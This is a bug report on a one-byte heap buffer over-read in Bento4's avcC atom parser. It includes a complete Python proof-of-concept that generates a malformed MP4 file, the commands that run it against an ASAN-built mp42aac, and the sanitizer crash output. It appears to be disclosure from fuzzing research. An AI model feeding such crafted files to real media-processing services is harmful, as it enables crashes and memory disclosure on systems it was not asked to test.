## Bug0: Heap Buffer Over-Read of num_pic_params in AP4_AvccAtom::Create()

In `AP4_AvccAtom::Create()` in `Ap4AvccAtom.cpp`, the boundary guard at line 87 (`cursor > payload_size`) permits execution to continue when `cursor == payload_size`, so line 88 reads `payload[cursor]` one byte past the end of the heap-allocated buffer, causing a heap-buffer-overflow read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, data=b''):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, box_type) + data

def make_fullbox(box_type, version=0, flags=0, data=b''):
    return make_box(box_type, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp
ftyp = make_box('ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

# avcC payload (8 bytes) crafted to trigger the OOB read:
#   payload[5]&31=1 → num_seq_params=1
#   payload[6..7]=0x00 0x00 → seq_param_length=0
# After the seq-params loop: cursor=8=payload_size → payload[8] is read OOB at line 88
avcc_payload = bytes([
    0x01,       # version
    0x4D,       # profile
    0x40,       # profile_compatibility
    0x0A,       # level
    0xFF,       # nalu_length_size field
    0xE1,       # 0xE0 | num_seq_params=1
    0x00, 0x00, # seq_param_length=0 (zero-length SPS)
])
assert len(avcc_payload) == 8  # payload_size = 16 - 8 = 8

avcc = make_box('avcC', avcc_payload)  # total size=16
assert len(avcc) == 16

identity_matrix = struct.pack('>IIIIIIIII',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)

avc1_data = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00' * 2 +
    b'\x00' * 2 +
    b'\x00' * 12 +
    struct.pack('>HH', 320, 240) +
    struct.pack('>II', 0x00480000, 0x00480000) +
    b'\x00' * 4 +
    struct.pack('>H', 1) +
    b'\x00' * 32 +
    struct.pack('>H', 0x0018) +
    struct.pack('>H', 0xFFFF) +
    avcc
)
avc1 = make_box('avc1', avc1_data)

stsd = make_fullbox('stsd', 0, 0, struct.pack('>I', 1) + avc1)
stts = make_fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = make_fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = make_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = make_fullbox('stco', 0, 0, struct.pack('>I', 0))
stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)

vmhd = make_fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)
url  = make_fullbox('url ', 0, 1, b'')
dref = make_fullbox('dref', 0, 0, struct.pack('>I', 1) + url)
dinf = make_box('dinf', dref)
minf = make_box('minf', vmhd + dinf + stbl)

mdhd = make_fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +
    struct.pack('>HH', 0x55C4, 0))
hdlr = make_fullbox('hdlr', 0, 0,
    struct.pack('>I', 0) + b'vide' + b'\x00' * 12 + b'Video\x00')
mdia = make_box('mdia', mdhd + hdlr + minf)

tkhd = make_fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +
    b'\x00' * 8 +
    struct.pack('>HHHH', 0, 0, 0x0100, 0) +
    identity_matrix +
    struct.pack('>II', 320 << 16, 240 << 16))
trak = make_box('trak', tkhd + mdia)

mvhd = make_fullbox('mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 1000, 0, 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    identity_matrix +
    b'\x00' * 24 +
    struct.pack('>I', 2))
moov = make_box('moov', mvhd + trak)

mp4_data = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f"Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000118 at pc 0x55cd0b5efb75 bp 0x7ffe7cfc7300 sp 0x7ffe7cfc72f0
READ of size 1 at 0x502000000118 thread T0
    #0 0x55cd0b5efb74 in AP4_AvccAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0x9fab74)
    #1 0x55cd0b5c71e1 in AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&) (mp42aac+0x9d21e1)

### Impact

An attacker who supplies a crafted MP4 file to any invocation of mp42aac can trigger a one-byte heap-buffer-overflow read immediately past the avcC payload buffer, exposing one byte of adjacent heap metadata or object data and constituting an information disclosure. In memory layouts where the adjacent byte falls in an unmapped page, the read causes a process crash, producing a denial-of-service condition. The attack surface is any use of mp42aac (or the Bento4 library) on an untrusted MP4 file, requiring no special privileges.
